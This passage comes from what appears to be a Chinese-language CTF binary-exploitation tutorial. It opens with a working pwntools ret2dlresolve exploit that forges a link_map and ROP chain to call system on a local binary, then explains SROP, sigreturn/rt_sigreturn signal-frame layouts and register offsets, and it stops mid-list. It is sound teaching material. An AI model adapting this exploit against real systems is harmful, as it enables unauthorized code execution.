<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process([<span class="string">&#x27;./without_leak&#x27;</span>])</span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,1234)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./without_leak&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rw_mem = elf.bss() + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">n64 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000000000000000</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_fake_link_map</span>(<span class="params">fake_linkmap_addr, func, base_func=<span class="string">&#x27;puts&#x27;</span></span>):</span><br><span class="line">    offset = n64(libc.sym[func] - libc.sym[base_func])</span><br><span class="line">    linkmap = p64(offset)  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(elf.bss())  <span class="comment"># l_info[5]</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x100</span>)  <span class="comment"># l_info[6]</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x110</span>)  <span class="comment"># l_info[23]</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(elf.got[base_func] - <span class="number">8</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(fake_linkmap_addr + <span class="number">0x120</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(n64(elf.bss() - offset)) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># Elf64_Rel</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *system\nb *0x40119A\ndir /glibc/2.35/source&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fake_link_map_addr = elf.bss() + <span class="number">0x800</span></span><br><span class="line">fake_link_map = build_fake_link_map(fake_link_map_addr, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = fake_link_map_addr + <span class="built_in">len</span>(fake_link_map)</span><br><span class="line">resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="number">0x28</span> * <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rsi; pop r15; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(fake_link_map_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(sh_addr)</span><br><span class="line">payload += p64(resolve_plt + <span class="number">6</span>)</span><br><span class="line">payload += p64(fake_link_map_addr)  <span class="comment"># truct link_map *l</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># ElfW(Word) reloc_arg</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = fake_link_map + <span class="string">&#x27;cat flag&gt;&amp;0\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>内核给用户空间送信号（<code>SIGSEGV</code>、<code>SIGINT</code> 等）时，会在用户栈上 <strong>构造一个 signal frame</strong>，里边包含：</p>
<ul>
<li>所有寄存器现场（<code>eip/esp/eflags/...</code> 或 <code>rip/rsp/...</code>）</li>
<li>段寄存器 &#x2F; CPL &#x2F; sigmask</li>
<li>以及可选的 FPU &#x2F; xsave 状态、<code>siginfo_t</code> 、<code>ucontext_t</code> 等</li>
</ul>
<p>当用户态信号处理函数跑完，会调用 <code>sigreturn</code>（或 <code>rt_sigreturn</code>），<strong>内核从栈上把这个 frame 直接拷回寄存器，然后 <code>iret</code> 返回到被中断的位置</strong>。</p>
<p>SROP 就是反过来——<strong>伪造这个 frame</strong>，然后想办法触发一次 <code>sigreturn</code>，让内核“帮我们”把寄存器设置成任意值。</p>
<h2 id="sigreturn-系统调用"><a href="#sigreturn-系统调用" class="headerlink" title="sigreturn 系统调用"></a>sigreturn 系统调用</h2><p><code>sigreturn</code> 就是“<strong>内核用来“从 signal frame 里恢复全部寄存器现场”的系统调用</strong>”。</p>
<p>也就是说：</p>
<ul>
<li>正常程序在跑 → 收到一个信号（比如 SIGINT）→ 内核“打断”你，把上下文保存到栈上（signal frame）。</li>
<li>然后切到你的信号处理函数（handler）。</li>
<li>handler 干完活之后，需要“回到被打断的地方继续执行”。</li>
<li>这一步就是靠 <strong>sigreturn</strong>（或者更常见的 <strong>rt_sigreturn</strong>）完成的。</li>
</ul>
<p>用户态基本不会手动调用它，一般是 glibc 的 signal&#x2F;sigaction 封装在 handler 的外面帮你做。</p>
<p>以 x86 为例，流程大概是：</p>
<ol>
<li><p><strong>进程在正常跑</strong>，寄存器里是“现场 A”（EIP&#x2F;RIP 指向某条指令）。</p>
</li>
<li><p>来了一个信号（内核或外部事件触发）。</p>
</li>
<li><p><strong>内核陷入</strong>（中断&#x2F;异常入口），决定要交付这个信号。</p>
</li>
<li><p>内核做几件事：</p>
<ul>
<li><p>选择一个栈（普通栈或 <code>sigaltstack</code>）。</p>
</li>
<li><p>在这个栈上<strong>压入一个“signal frame”</strong>：</p>
<ul>
<li>老 ABI：<code>struct sigcontext</code> 等。</li>
<li>RT ABI：<code>siginfo_t</code> + <code>ucontext_t</code>（里面有 <code>mcontext</code>&#x2F;<code>sigcontext</code> 和完整的 sigmask）。</li>
</ul>
</li>
<li><p>这个 frame 里包含之前所有寄存器、signal mask 等信息。</p>
</li>
<li><p>修改寄存器：</p>
<ul>
<li>指令指针（eip&#x2F;rip&#x2F;pc）改为 <strong>你注册的 handler 地址</strong>。</li>
<li>栈指针（esp&#x2F;rsp&#x2F;sp）改为刚刚压好 frame 的位置。</li>
<li>其它必要寄存器按 ABI 约定设好（传参：signum, siginfo, ucontext）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>返回用户态</strong>，此时 CPU 在执行你的 handler，就像是普通函数一样。</p>
</li>
</ol>
<p>也就是说：<strong>内核自己构造了一个“假的调用现场”，让你看起来像是“从某个地方 call 进了 handler”。</strong></p>
<p>当 handler 执行完毕后，C 语言层面你一般就写：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// return;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但实际上：</p>
<ul>
<li><p>glibc 在安装 handler 时，并不是直接把 handler 地址给内核，而是给了一个 <strong>小 stub</strong>：</p>
<ul>
<li><p>这个 stub 会先调用你的 handler。</p>
</li>
<li><p>等 handler 返回后，stub 会执行：</p>
<ul>
<li>对老 ABI：<code>movl $__NR_sigreturn, %eax; int $0x80</code></li>
<li>对 RT ABI：<code>movl $__NR_rt_sigreturn, %eax; int $0x80</code></li>
</ul>
</li>
</ul>
</li>
<li><p>就这样，handler“结束”时，并不是普通的 <code>ret</code>，而是执行了一个系统调用：<strong>sigreturn &#x2F; rt_sigreturn</strong>。</p>
</li>
</ul>
<p>内核看到这个系统调用号，就知道：</p>
<blockquote>
<p>“哦，这是 signal handler 要结束了，我要从用户栈上的 signal frame 把之前保存的现场恢复回来。”</p>
</blockquote>
<p>于是：</p>
<ol>
<li>内核读取当前栈指针（esp&#x2F;rsp&#x2F;sp）。</li>
<li>按照本架构的 ABI 约定，从那里解析出 <code>sigcontext</code>&#x2F;<code>ucontext</code> 等结构。</li>
<li>从这些结构里把所有寄存器（通用寄存器 + PC + SP + FLAGS + 段寄存器 + signal mask …）都恢复。</li>
<li>像从中断返回一样，<strong>直接跳回原来被打断代码的 eip&#x2F;rip</strong>。</li>
</ol>
<p>注意关键点：<br><strong>sigreturn 不“返回到调用 sigreturn 的地方”，而是跳到 frame 里保存的 PC 地址。</strong></p>
<p>流程是这样：</p>
<ol>
<li><p>进程收到信号（比如 <code>SIGINT</code>）时，<br>内核会：</p>
<ul>
<li><p>在 <strong>用户栈</strong> 上布置一个 <em>信号栈帧</em>（signal frame），里面保存：</p>
<ul>
<li>各种寄存器（EAX&#x2F;EBX&#x2F;ECX&#x2F;EIP&#x2F;ESP&#x2F;EFLAGS&#x2F;CS&#x2F;SS&#x2F;…）</li>
<li>信号屏蔽字、栈信息、段寄存器等等</li>
</ul>
</li>
<li><p>把返回地址伪造为一个 <strong>用户态的小 trampoline</strong>，这个就是你看到的：</p>
<ul>
<li><code>__kernel_sigreturn</code></li>
<li>或者 <code>__kernel_rt_sigreturn</code>（在 vdso&#x2F;vsyscall 里）</li>
</ul>
</li>
</ul>
</li>
<li><p>内核再把 <code>EIP</code> 设置成 signal handler 的入口地址，然后返回到用户态执行 handler。</p>
</li>
<li><p><strong>信号处理函数结束时</strong>，glibc 会调用那个 trampoline：</p>
<ul>
<li>比如 i386 常见的是：<br><code>__kernel_rt_sigreturn: mov eax, 0xad; int 0x80</code></li>
<li>也就是说，它做的就是触发 <code>sys_rt_sigreturn</code> 这个系统调用。</li>
</ul>
</li>
<li><p>内核看到 <code>sys_rt_sigreturn</code>，会从当前 ESP 指向的位置，把信号帧（sigframe &#x2F; ucontext）里的寄存器全部读出来，恢复现场，然后跳回到原来的 <code>EIP</code>，相当于“当初没被信号打断过”。</p>
</li>
</ol>
<h2 id="32-位的-SROP"><a href="#32-位的-SROP" class="headerlink" title="32 位的 SROP"></a>32 位的 SROP</h2><p>在 32 位 x86 上，Linux 有两个跟信号恢复相关的系统调用号：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn     119  <span class="comment">// 老接口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn  173  <span class="comment">// 实时信号接口（real‑time）</span></span></span><br></pre></td></tr></table></figure></div>

<p>区别主要在两点：</p>
<ol>
<li><p><strong>历史 &amp; 兼容性</strong></p>
<ul>
<li><code>sigreturn(119)</code> 是比较早期的接口，配合旧版 <code>struct sigaction</code> 使用。</li>
<li><code>rt_sigreturn(173)</code> 是为了支持 POSIX real‑time signals 引入的“新接口”，可以保存更多信息（<code>siginfo_t</code>、更大的信号掩码等）。</li>
<li>现代 glibc &#x2F; 内核在 **发信号 &#x2F; 恢复上下文时基本都用 <code>rt_sigreturn</code>**，传统 <code>sigreturn</code> 主要出现在 <strong>老代码或兼容路径</strong>，但对漏洞利用我们仍然可以直接用。</li>
</ul>
</li>
<li><p><strong>栈上 signal frame 格式不同</strong></p>
<ul>
<li><code>sigreturn</code>：栈上的结构比较简单，核心是一个 <code>struct sigcontext</code>。</li>
<li><code>rt_sigreturn</code>：栈上是 <code>struct rt_sigframe</code>，里面嵌套 <code>siginfo_t</code> + <code>ucontext_t</code>，而寄存器状态在 <code>ucontext_t.uc_mcontext</code>（本质也是 <code>struct sigcontext</code>）。</li>
</ul>
</li>
</ol>
<p>对 <strong>SROP（Sigreturn Oriented Programming）</strong> 来说：<br>你 ROP &#x2F; 栈溢出把 <code>eip</code> 控到内核提供的 <code>__kernel_sigreturn</code> 或 <code>__kernel_rt_sigreturn</code> stub 上，然后伪造对应格式的 “signal frame”，内核就会从栈里把所有寄存器一次性 restore。</p>
<h3 id="sigreturn（119）——老接口的-frame-格式"><a href="#sigreturn（119）——老接口的-frame-格式" class="headerlink" title="sigreturn（119）——老接口的 frame 格式"></a><code>sigreturn</code>（119）——老接口的 frame 格式</h3><h4 id="谁会调用-sigreturn"><a href="#谁会调用-sigreturn" class="headerlink" title="谁会调用 sigreturn"></a>谁会调用 <code>sigreturn</code></h4><ul>
<li><p><strong>正常程序不会直接调用</strong>，这是内核和 libc 玩的事情：</p>
<ol>
<li><p>内核要给用户发信号时，会在用户栈上构造一个 <strong>signal frame</strong>，把当前寄存器等状态先保存下来。</p>
</li>
<li><p>然后修改 <code>eip/esp</code> 跳到用户的 signal handler。</p>
</li>
<li><p>signal handler 结束时，会执行一个内核给的 “trampoline”，大概就是：</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__kernel_sigreturn:</span></span><br><span class="line">    <span class="keyword">pop</span>  <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0x77</span></span><br><span class="line">    <span class="keyword">int</span>  <span class="number">0x80</span>         <span class="comment">; sys_sigreturn</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>这个 <code>int 0x80</code> 就是 <code>sys_sigreturn</code>，内核看到之后，从栈上的 <code>struct sigcontext</code> 恢复所有寄存器，<code>iret</code> 回去。</p>
</li>
</ol>
</li>
<li><p>对我们写 exp 来说，只要内存里存在这个 stub（vdso &#x2F; vsyscall），就可以把它当成一个 gadget：<br>“<strong>调这个 gadget &#x3D; 触发一次 sigreturn</strong>”。</p>
</li>
</ul>
<h4 id="sigreturn-的栈布局（32-位）"><a href="#sigreturn-的栈布局（32-位）" class="headerlink" title="sigreturn 的栈布局（32 位）"></a><code>sigreturn</code> 的栈布局（32 位）</h4><p>内核在 32 位进程上构造的老式 signal frame，可以简化成这样：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigframe</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>                sig;       <span class="comment">// 信号编号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span>  <span class="title">sc</span>;</span>        <span class="comment">// 寄存器上下文</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span>   *<span class="title">fpstate</span>;</span>   <span class="comment">// 浮点寄存器状态</span></span><br><span class="line">    <span class="comment">/* 其它兼容字段，通常对 SROP 不重要 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>我们关心的是里面的 <code>struct sigcontext sc</code>。<br>在 pwntools 里，你看到的这个映射就是它的布局（偏移 &#x3D;&gt; 寄存器名）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">registers[<span class="string">&#x27;i386&#x27;</span>] = &#123;</span><br><span class="line">    <span class="number">0</span>:  <span class="string">&#x27;gs&#x27;</span>,</span><br><span class="line">    <span class="number">4</span>:  <span class="string">&#x27;fs&#x27;</span>,</span><br><span class="line">    <span class="number">8</span>:  <span class="string">&#x27;es&#x27;</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="string">&#x27;ds&#x27;</span>,</span><br><span class="line">    <span class="number">16</span>: <span class="string">&#x27;edi&#x27;</span>,</span><br><span class="line">    <span class="number">20</span>: <span class="string">&#x27;esi&#x27;</span>,</span><br><span class="line">    <span class="number">24</span>: <span class="string">&#x27;ebp&#x27;</span>,</span><br><span class="line">    <span class="number">28</span>: <span class="string">&#x27;esp&#x27;</span>,</span><br><span class="line">    <span class="number">32</span>: <span class="string">&#x27;ebx&#x27;</span>,</span><br><span class="line">    <span class="number">36</span>: <span class="string">&#x27;edx&#x27;</span>,</span><br><span class="line">    <span class="number">40</span>: <span class="string">&#x27;ecx&#x27;</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="string">&#x27;eax&#x27;</span>,</span><br><span class="line">    <span class="number">48</span>: <span class="string">&#x27;trapno&#x27;</span>,</span><br><span class="line">    <span class="number">52</span>: <span class="string">&#x27;err&#x27;</span>,</span><br><span class="line">    <span class="number">56</span>: <span class="string">&#x27;eip&#x27;</span>,</span><br><span class="line">    <span class="number">60</span>: <span class="string">&#x27;cs&#x27;</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">&#x27;eflags&#x27;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&#x27;esp_at_signal&#x27;</span>,</span><br><span class="line">    <span class="number">72</span>: <span class="string">&#x27;ss&#x27;</span>,</span><br><span class="line">    <span class="number">76</span>: <span class="string">&#x27;fpstate&#x27;</span>,  // 指针</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>关键点：</p>
<ul>
<li><code>56</code> 偏移是 <code>eip</code>，内核会把这里的值加载进 <code>EIP</code>。</li>
<li><code>28</code> 偏移是 <code>esp</code>（即中断发生时的用户栈指针）。</li>
<li><code>60</code>&#x2F;<code>72</code> 是 <code>CS</code> &#x2F; <code>SS</code> 段寄存器。</li>
<li><code>64</code> 是 <code>EFLAGS</code>。</li>
</ul>
<p>也就是说，只要你能控制这块内存的内容，并让内核调用 <code>sys_sigreturn</code>，你就实现了一次：</p>
<blockquote>
<p>“<strong>全寄存器可控的上下文切换</strong>”。</p>
</blockquote>
<h4 id="sigreturn-的恢复过程（逻辑）"><a href="#sigreturn-的恢复过程（逻辑）" class="headerlink" title="sigreturn 的恢复过程（逻辑）"></a><code>sigreturn</code> 的恢复过程（逻辑）</h4><p>内核在处理 <code>sys_sigreturn</code> 时，大致做：</p>
<ol>
<li>从当前 <code>ESP</code> 指向的位置，读取一个 <code>struct sigcontext</code>。</li>
<li>把里面的 <code>gs/fs/es/ds/edi/esi/ebp/esp/ebx/edx/ecx/eax</code> 都恢复出来。</li>
<li>用 <code>eip/cs/eflags/esp/ss</code> 等组装一个 <code>iret</code> frame。</li>
<li><code>iret</code> 回到用户态。</li>
</ol>
<p>对 SROP 你只需要记住：</p>
<ul>
<li><strong>调用 sigreturn 时，ESP 必须指向你伪造的 sigcontext</strong>；</li>
<li>你设置好的 <code>eip/esp/...</code> 就会生效。</li>
</ul>
<h4 id="在不同内核上的-CS-SS-默认值"><a href="#在不同内核上的-CS-SS-默认值" class="headerlink" title="在不同内核上的 CS&#x2F;SS 默认值"></a>在不同内核上的 CS&#x2F;SS 默认值</h4><p>你看到 pwntools 里有两个 default：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">defaults = &#123;</span><br><span class="line">    <span class="string">&quot;i386&quot;</span> : &#123;<span class="string">&quot;cs&quot;</span>: <span class="number">0x73</span>, <span class="string">&quot;ss&quot;</span>: <span class="number">0x7b</span>&#125;,</span><br><span class="line">    <span class="string">&quot;i386_on_amd64&quot;</span>: &#123;<span class="string">&quot;cs&quot;</span>: <span class="number">0x23</span>, <span class="string">&quot;ss&quot;</span>: <span class="number">0x2b</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是因为：</p>
<ul>
<li><p><strong>32 位进程跑在 32 位内核上</strong> 时：</p>
<ul>
<li>用户态段选择子是 <code>0x73</code>（CS）、<code>0x7b</code>（SS）。</li>
</ul>
</li>
<li><p><strong>32 位进程跑在 64 位内核（兼容模式）上</strong> 时：</p>
<ul>
<li>用户态段选择子是 <code>0x23</code>（CS）、<code>0x2b</code>（SS）。</li>
</ul>
</li>
</ul>
<p>如果你伪造 frame 把 CS&#x2F;SS 搞成不合法的值，就会在 <code>iret</code> 时直接炸掉。所以：</p>
<ul>
<li><code>context.arch = &#39;i386&#39;</code> 决定的是 <strong>寄存器名字 &#x2F; 结构布局</strong>（就是上面那一堆 offset）。</li>
<li><code>context.kernel = &#39;i386&#39;</code> or <code>&#39;amd64&#39;</code> 决定 pwntools 在生成 frame 时，<strong>默认给你填哪个 cs&#x2F;ss</strong>。</li>
</ul>
<p>这就是你在 GDB 里看到 <code>cs = 0x23, ss = 0x2b</code> 的原因——你是 32-bit 进程跑在 64-bit 内核的 compat 模式。</p>
<h3 id="rt-sigreturn（173）——实时信号接口"><a href="#rt-sigreturn（173）——实时信号接口" class="headerlink" title="rt_sigreturn（173）——实时信号接口"></a><code>rt_sigreturn</code>（173）——实时信号接口</h3><h4 id="为什么会有-rt-sigreturn"><a href="#为什么会有-rt-sigreturn" class="headerlink" title="为什么会有 rt_sigreturn"></a>为什么会有 <code>rt_sigreturn</code></h4><p>老的 <code>sigreturn</code> 接口有一些限制，例如：</p>
<ul>
<li><code>sigmask</code> 大小固定，不足以表示 real-time signals 的扩展集合；</li>
<li>结构不够通用，想保存更多上下文信息不方便；</li>
</ul>
<p>于是内核引入了 <strong>实时信号接口</strong>：</p>
<ul>
<li><code>rt_sigaction</code></li>
<li><code>rt_sigprocmask</code></li>
<li><code>rt_sigreturn</code>（173）</li>
</ul>
<p>现代 glibc 基本都走 RT 这套接口。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">__kernel_rt_sigreturn:</span></span><br><span class="line">    <span class="keyword">mov</span>  <span class="built_in">eax</span>, <span class="number">0xAD</span></span><br><span class="line">    <span class="keyword">int</span>  <span class="number">0x80</span>         <span class="comment">; sys_rt_sigreturn</span></span><br></pre></td></tr></table></figure></div>

<h4 id="rt-sigreturn-的栈布局（32-位）"><a href="#rt-sigreturn-的栈布局（32-位）" class="headerlink" title="rt_sigreturn 的栈布局（32 位）"></a><code>rt_sigreturn</code> 的栈布局（32 位）</h4><p>32 位下，内核构造的 rt signal frame 通常叫 <code>struct rt_sigframe</code>，可以简化理解为：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rt_sigframe</span> &#123;</span></span><br><span class="line">    <span class="type">siginfo_t</span>   info;  <span class="comment">// 详细的信号信息（si_signo, si_code, ...）</span></span><br><span class="line">    <span class="type">ucontext_t</span>  uc;    <span class="comment">// 上下文，里面有寄存器、栈、sigmask 等</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>ucontext_t</code> 里关键字段大概是这样：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="type">stack_t</span>   uc_stack;</span><br><span class="line">    <span class="type">sigset_t</span>  uc_sigmask;</span><br><span class="line">    <span class="comment">/* 这里还有扩展字段 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> <span class="title">uc_mcontext</span>;</span>  <span class="comment">// 寄存器上下文（重点）</span></span><br><span class="line">&#125; <span class="type">ucontext_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>对 SROP 来说最重要的是：</p>
<blockquote>
<p><strong>寄存器仍然是一个 <code>struct sigcontext</code>，只是现在被放在 <code>uc.uc_mcontext</code> 里。</strong></p>
</blockquote>
<p>也就是说：</p>
<ul>
<li><code>struct sigcontext</code> 的内部布局 <strong>跟 119 号 sigreturn 用的是同一套</strong>（gs, fs, …, eip, cs, eflags, esp_at_signal, ss）。</li>
<li>只是你在伪造 frame 时，需要在前面先铺一段 <code>siginfo_t</code> + <code>ucontext_t</code> 的头，再在 ucontext 里面对齐到 <code>uc_mcontext</code>，再开始填 sigcontext 那 80 个字节。</li>
</ul>
<p>pwntools 在 amd64 的 <code>SigreturnFrame</code> 里做的事情也是一样的，只不过结构更大。</p>
<h4 id="内核处理-rt-sigreturn-的流程（概念）"><a href="#内核处理-rt-sigreturn-的流程（概念）" class="headerlink" title="内核处理 rt_sigreturn 的流程（概念）"></a>内核处理 <code>rt_sigreturn</code> 的流程（概念）</h4><p>处理 <code>sys_rt_sigreturn</code> 时，内核做的事情大致是：</p>
<ol>
<li>从当前 <code>ESP</code> 指向的位置，解释为 <code>struct rt_sigframe</code>。</li>
<li>读取里面的 <code>ucontext_t uc</code>。</li>
<li>用 <code>uc.uc_mcontext</code> 中的那份 <code>sigcontext</code> 恢复寄存器、EIP、ESP、EFLAGS 等。</li>
<li>用 <code>uc.uc_sigmask</code> 恢复信号掩码。</li>
<li><code>iret</code> 回到用户态。</li>
</ol>
<p>可以看到，<strong>恢复寄存器的那一步，本质跟 <code>sigreturn</code> 是一样的，只是多套了几层壳，顺便恢复了更多信息。</strong></p>
<h4 id="对-SROP-利用的意义"><a href="#对-SROP-利用的意义" class="headerlink" title="对 SROP 利用的意义"></a>对 SROP 利用的意义</h4><p>在实战 &#x2F; 论文（比如 SROP 那篇）里：</p>
<ul>
<li>有时用的是 <code>rt_sigreturn</code>（尤其是 amd64 下），因为现代内核&#x2F;库都基于 RT 接口；</li>
<li>有时你能直接找到老的 <code>__kernel_sigreturn</code> stub，也可以用 119 号。</li>
</ul>
<p>SROP 核心只关心两件事：</p>
<ol>
<li><p><strong>我能不能让内核执行 sys_sigreturn &#x2F; sys_rt_sigreturn？</strong></p>
<ul>
<li>例如通过 vdso &#x2F; vsyscall 里的 <code>int 0x80; ret</code> 或 <code>syscall; ret</code> gadget。</li>
</ul>
</li>
